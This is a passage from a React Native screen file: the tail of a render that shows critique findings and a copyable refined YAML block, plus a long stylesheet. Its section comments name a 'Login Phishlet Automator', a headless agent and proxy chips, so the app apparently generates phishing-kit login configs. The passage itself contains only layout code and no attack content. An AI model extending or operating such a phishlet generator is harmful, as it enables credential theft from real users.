                  {iterateResult.passes} pass{iterateResult.passes !== 1 ? "es" : ""} · {iterateResult.critiques.length} finding{iterateResult.critiques.length !== 1 ? "s" : ""} · {iterateResult.improvements.length} improvement{iterateResult.improvements.length !== 1 ? "s" : ""}
                </Text>
                {iterateResult.critiques.length > 0 && (
                  <View style={styles.critiqueList}>
                    {iterateResult.critiques.map((c, i) => (
                      <View key={i} style={styles.critiqueRow}>
                        <View style={[styles.severityDot, c.severity === "critical" ? styles.sevCritical : c.severity === "warning" ? styles.sevWarning : styles.sevInfo]} />
                        <View style={styles.critiqueBody}>
                          <Text style={styles.critiqueFinding}>{c.finding}</Text>
                          <Text style={styles.critiqueFix}>{c.fix}</Text>
                        </View>
                      </View>
                    ))}
                  </View>
                )}
                {refinedYaml ? (
                  <>
                    <ScrollView horizontal style={styles.codeScroll} showsHorizontalScrollIndicator={false}>
                      <Text style={styles.code}>{refinedYaml}</Text>
                    </ScrollView>
                    <Pressable onPress={() => copy(refinedYaml, "refined")} style={styles.copyRow}>
                      {copiedField === "refined" ? <Check size={12} color={theme.colors.ok} /> : <Copy size={12} color={theme.colors.accent} />}
                      <Text style={styles.copyText}>{copiedField === "refined" ? "Copied" : "Copy refined YAML"}</Text>
                    </Pressable>
                  </>
                ) : null}
              </View>
            ) : null}
          </>
        )}
      </ScrollView>
    </View>
  );
}

// ── Mini sub-components ──

function MiniMetric({ label, value }: { label: string; value: number }) {
  return (
    <View style={styles.miniMetric}>
      <Text style={styles.miniMetricValue}>{value}</Text>
      <Text style={styles.miniMetricLabel}>{label}</Text>
    </View>
  );
}

// ── Styles ──
const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: theme.colors.bg },
  glow: { position: "absolute", top: 0, left: 0, right: 0, height: 280 },
  content: { paddingHorizontal: theme.spacing(4), paddingBottom: theme.spacing(12), gap: theme.spacing(4) },
  eyebrow: { color: theme.colors.accent, fontSize: 12, fontWeight: "700", letterSpacing: 2, fontFamily: theme.font.mono },
  hero: { color: theme.colors.text, fontSize: 28, fontWeight: "800", letterSpacing: -0.5, marginTop: theme.spacing(1) },
  sub: { color: theme.colors.textDim, fontSize: 13, lineHeight: 20, marginTop: theme.spacing(1.5) },

  // State card
  stateCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(6), gap: theme.spacing(3), alignItems: "center" },
  stateText: { color: theme.colors.textDim, fontSize: 14, textAlign: "center" },
  errorText: { color: theme.colors.danger, fontSize: 14, fontFamily: theme.font.mono, textAlign: "center" },

  // Control card
  controlCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(4), gap: theme.spacing(4) },
  controlTop: { gap: theme.spacing(2) },
  controlLabel: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 1.2, fontFamily: theme.font.mono },
  proxyChips: { flexDirection: "row", flexWrap: "wrap", gap: theme.spacing(2) },
  chip: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
  chipActive: { backgroundColor: "rgba(255,178,62,0.10)", borderColor: theme.colors.warn },
  chipText: { color: theme.colors.textDim, fontSize: 12, fontWeight: "600", fontFamily: theme.font.mono },
  chipTextActive: { color: theme.colors.warn },
  scanBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, borderRadius: theme.radius.md, paddingVertical: theme.spacing(3.5) },
  scanBtnBusy: { opacity: 0.7 },
  scanBtnText: { color: theme.colors.bg, fontSize: 14, fontWeight: "800" },
  pressed: { opacity: 0.55 },

  // Login Phishlet Automator
  loginCard: { gap: theme.spacing(3) },
  loginRow: { flexDirection: "row", gap: theme.spacing(2) },
  loginInput: { flex: 1, backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5), color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono },
  loginBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.accent, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5) },
  loginBtnDisabled: { opacity: 0.5 },
  loginBtnText: { color: theme.colors.bg, fontSize: 12, fontWeight: "800" },
  loginYamlCard: { backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2) },
  loginYamlHeader: { flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  loginYamlTitle: { color: theme.colors.text, fontSize: 12, fontWeight: "700" },
  copyBtn: { padding: theme.spacing(1) },
  loginYaml: { color: theme.colors.textDim, fontSize: 10, fontFamily: theme.font.mono, lineHeight: 16 },
  loginYamlApplied: { color: theme.colors.ok, fontSize: 10, fontFamily: theme.font.mono, marginTop: -theme.spacing(1) },
  loginStatus: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), paddingVertical: theme.spacing(2) },
  loginStatusText: { color: theme.colors.textDim, fontSize: 12, fontFamily: theme.font.mono },

  // Headless Agent
  agentCard: { gap: theme.spacing(3) },
  agentSub: { color: theme.colors.textDim, fontSize: 12, lineHeight: 18 },
  agentToggle: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingVertical: theme.spacing(2.5) },
  agentToggleDisabled: { opacity: 0.5 },
  agentToggleText: { color: theme.colors.text, fontSize: 12, fontWeight: "700" },
  agentCommandCard: { backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2) },
  agentCommand: { color: theme.colors.cyan, fontSize: 10, fontFamily: theme.font.mono, lineHeight: 16 },
  agentNote: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono, lineHeight: 15 },

  // Progress bar
  progressBar: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, paddingVertical: theme.spacing(3), paddingHorizontal: theme.spacing(4) },
  progressSteps: { flexDirection: "row", justifyContent: "space-between" },
  progressStep: { alignItems: "center", gap: theme.spacing(1.5) },
  progressDot: { width: 20, height: 20, borderRadius: 10, borderWidth: 2, borderColor: theme.colors.border, backgroundColor: theme.colors.bgElevated, alignItems: "center", justifyContent: "center" },
  progressLabel: { color: theme.colors.textFaint, fontSize: 9, fontWeight: "700", fontFamily: theme.font.mono, letterSpacing: 0.5 },

  // Browser
  browserPanel: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden" },
  browserHeader: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5), borderBottomWidth: 1, borderBottomColor: theme.colors.border, gap: theme.spacing(2) },
  browserUrlWrap: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), flex: 1 },
  browserUrl: { color: theme.colors.textDim, fontSize: 11, fontFamily: theme.font.mono, flex: 1 },
  closeBrowser: { paddingHorizontal: theme.spacing(2), paddingVertical: theme.spacing(1) },
  closeBrowserText: { color: theme.colors.textFaint, fontSize: 11, fontWeight: "600" },
  webviewWrap: { height: 340, backgroundColor: theme.colors.bg, margin: theme.spacing(2), borderRadius: theme.radius.sm, overflow: "hidden" },
  webview: { flex: 1 },

  // Intel card
  intelCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(4), gap: theme.spacing(3) },
  intelHeader: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  intelTitle: { color: theme.colors.text, fontSize: 14, fontWeight: "700", flex: 1 },
  intelRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
  intelVal: { color: theme.colors.textDim, fontSize: 11, fontFamily: theme.font.mono, flex: 1 },
  metrics: { flexDirection: "row", gap: theme.spacing(2) },
  miniMetric: { flex: 1, backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(2.5), alignItems: "center" },
  miniMetricValue: { color: theme.colors.text, fontSize: 16, fontWeight: "800", fontFamily: theme.font.mono },
  miniMetricLabel: { color: theme.colors.textFaint, fontSize: 9, fontWeight: "700", letterSpacing: 0.5, fontFamily: theme.font.mono, marginTop: 2 },

  // Detail lists inside intel card
  detailList: { gap: theme.spacing(1.5) },
  detailListTitle: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 0.5, fontFamily: theme.font.mono },
  detailRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5) },
  detailText: { color: theme.colors.textDim, fontSize: 10, fontFamily: theme.font.mono, flex: 1 },

  // Result cards
  resultCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(4), gap: theme.spacing(3) },
  resultHeader: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  resultTitle: { color: theme.colors.text, fontSize: 14, fontWeight: "700", flex: 1 },
  codeScroll: { maxHeight: 200 },
  code: { color: theme.colors.text, fontSize: 10, fontFamily: theme.font.mono, lineHeight: 16 },
  copyRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), alignSelf: "flex-start", backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
  copyText: { color: theme.colors.accent, fontSize: 11, fontWeight: "700" },

  // Score
  scoreBadge: { borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(2), paddingVertical: 2 },
  scoreGood: { backgroundColor: "rgba(60,224,138,0.12)", borderWidth: 1, borderColor: "rgba(60,224,138,0.35)" },
  scoreWarn: { backgroundColor: "rgba(255,178,62,0.12)", borderWidth: 1, borderColor: "rgba(255,178,62,0.35)" },
  scoreText: { color: theme.colors.text, fontSize: 11, fontWeight: "800", fontFamily: theme.font.mono },
  iterateMeta: { color: theme.colors.textFaint, fontSize: 11, fontFamily: theme.font.mono },

  // Critiques
  critiqueList: { gap: theme.spacing(2) },
  critiqueRow: { flexDirection: "row", gap: theme.spacing(2) },
  severityDot: { width: 7, height: 7, borderRadius: 4, marginTop: 4 },
  sevCritical: { backgroundColor: theme.colors.danger },
  sevWarning: { backgroundColor: theme.colors.warn },
  sevInfo: { backgroundColor: theme.colors.accent },
  critiqueBody: { flex: 1 },
  critiqueFinding: { color: theme.colors.textDim, fontSize: 11, lineHeight: 17 },
  critiqueFix: { color: theme.colors.accent, fontSize: 10, fontFamily: theme.font.mono, marginTop: 1 },
});
